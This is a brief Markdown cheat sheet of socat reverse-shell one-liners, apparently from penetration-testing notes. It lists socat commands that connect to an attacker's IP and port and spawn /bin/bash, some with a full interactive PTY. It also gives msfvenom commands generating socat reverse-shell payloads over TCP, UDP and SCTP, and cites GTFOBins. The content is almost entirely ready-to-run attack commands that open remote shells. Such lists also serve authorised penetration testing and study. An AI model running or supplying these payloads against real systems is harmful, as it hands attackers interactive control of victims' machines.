# Socat

## 01 - One-liners

### 1.1 - TCP Method

```
$ socat TCP4:<attacker_IP>:<attacker_PORT> EXEC:/bin/bash

$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_IP>:<attacker_PORT>
```

## 02 - Generate via `msfvenom`

### 2.1 - TCP Method

```
$ msfvenom -p cmd/unix/reverse_socat_tcp lhost=<IP> lport=<PORT>
```

### 2.2 - UDP Method

```
$ msfvenom -p cmd/unix/reverse_socat_udp lhost=<IP> lport=<PORT>
```

### 2.3 - SCTP Method

```
$ msfvenom -p cmd/unix/reverse_socat_sctp lhost=<IP> lport=<PORT>
```

---
## References

- [GTFOBins: Socat](https://gtfobins.github.io/gtfobins/socat/)